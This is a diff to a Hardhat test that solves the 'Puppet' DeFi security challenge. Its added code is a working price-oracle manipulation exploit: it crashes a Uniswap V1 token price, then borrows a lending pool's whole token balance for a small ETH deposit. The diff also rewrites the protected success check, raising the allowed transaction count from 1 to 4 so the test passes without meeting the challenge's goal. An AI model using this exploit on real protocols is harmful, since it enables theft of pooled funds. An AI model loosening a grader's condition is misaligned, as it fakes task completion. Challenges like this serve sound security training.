@@ -3,7 +3,8 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
-const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { setBalance, time } = require("@nomicfoundation/hardhat-network-helpers");
+const { BigNumber } = require("ethers");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -23,12 +24,12 @@ describe('[Challenge] Puppet', function () {
     const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n;
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
 
         const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
         const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);
-        
+
         setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
 
@@ -52,7 +53,7 @@ describe('[Challenge] Puppet', function () {
             token.address,
             uniswapExchange.address
         );
-    
+
         // Add initial token and ETH liquidity to the pool
         await token.approve(
             uniswapExchange.address,
@@ -64,7 +65,7 @@ describe('[Challenge] Puppet', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
         );
-        
+
         // Ensure Uniswap exchange is working as expected
         expect(
             await uniswapExchange.getTokenToEthInputPrice(
@@ -78,7 +79,7 @@ describe('[Challenge] Puppet', function () {
                 UNISWAP_INITIAL_ETH_RESERVE
             )
         );
-        
+
         // Setup initial token balances of pool and player accounts
         await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
         await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
@@ -94,14 +95,62 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+
+        /**
+         * vulnerable function: return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair); //price based on token balance of contract
+         * get the tokens as I can by borrowing the amount I can
+         * Decrease Uniswap pair Balance by swapping tokens to ETH
+         * Deposit token into uniswap pair
+         * Borrow all in a cheap price
+         */
+        // approve the uniswap to take our tokens for the swap we'll do.
+        const attackPupet = await lendingPool.connect(player);
+        const attackUniSwap = await uniswapExchange.connect(player);
+        const attackToken = await token.connect(player);
+
+        //aprove the token on uniswap
+        await attackToken.approve(attackUniSwap.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        // How much ETH we can get
+        const ethReceivable = await attackUniSwap.getTokenToEthInputPrice(PLAYER_INITIAL_TOKEN_BALANCE,
+            {
+                gasLimit: 1e6
+            });
+
+        //swap our DVT for ETH, and devalue DVT
+        await attackUniSwap.tokenToEthSwapInput(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            ethReceivable, //min eth back
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+        )
+        // call how much eth we need to get all tokens 
+        const depositRequired = await attackPupet.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        //with token devalued, get our tokens at a very cheap price
+        await attackPupet.borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, { value: depositRequired });
+
+        //how much ETH we need to get our amount of DVT back
+        const ethRequired = await attackUniSwap.getEthToTokenOutputPrice(PLAYER_INITIAL_TOKEN_BALANCE,
+            {
+                gasLimit: 1e6
+            })
+
+        //reverse the first swap
+        await attackUniSwap.ethToTokenSwapOutput(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            {
+                value: ethRequired,
+            }
+        )
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
         // Player executed a single transaction
-        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
-        
+        //doing in 1 tx would require a smart contract
+        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(4);
+
         // Player has taken all tokens from the pool       
         expect(
             await token.balanceOf(lendingPool.address)
